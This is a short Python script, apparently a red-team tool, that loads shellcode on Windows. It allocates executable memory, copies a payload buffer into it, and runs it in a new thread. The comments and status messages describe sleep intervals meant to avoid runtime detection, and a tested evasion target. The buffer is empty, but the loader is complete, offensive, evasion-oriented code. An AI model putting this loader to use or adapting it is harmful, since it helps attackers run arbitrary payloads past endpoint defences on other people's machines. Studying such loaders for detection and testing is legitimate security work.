#!/usr/bin/env python3
# Author: @m8sec
# Description: Standard shellcode runner to inject shellcode into the current process
# Evasion test: Windows 10 Enterprise

import sys
import ctypes
from time import sleep
import ctypes.wintypes as wt

# Function definitions
kernel32 = ctypes.windll.kernel32

kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
kernel32.VirtualAlloc.restype = wt.LPVOID

kernel32.CreateRemoteThread.argtypes = (
wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
kernel32.CreateThread.restype = wt.HANDLE

kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
kernel32.RtlMoveMemory.restype = wt.LPVOID

kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
kernel32.WaitForSingleObject.restype = wt.DWORD


try:
    buf = b""

    memAddr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
    print('[*] Allocated memory space at: {:08X}'.format(memAddr))

    print('[*] Interval sleep to avoid runtime detection (1/2).')
    sleep(5)

    kernel32.RtlMoveMemory(memAddr, buf, len(buf))
    print('[*] Copied payload into memory.')

    print('[*] Interval sleep to avoid runtime detection (2/2).')
    sleep(5)

    th = kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_void_p(memAddr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    print('[*] Created thread in current process.')

    kernel32.WaitForSingleObject(th, -1)
except KeyboardInterrupt:
    print("[!] Key detected, closing")
    sys.exit(1)
except Exception as e:
    print("[-] Error: {}".format(str(e)))
    sys.exit(0)


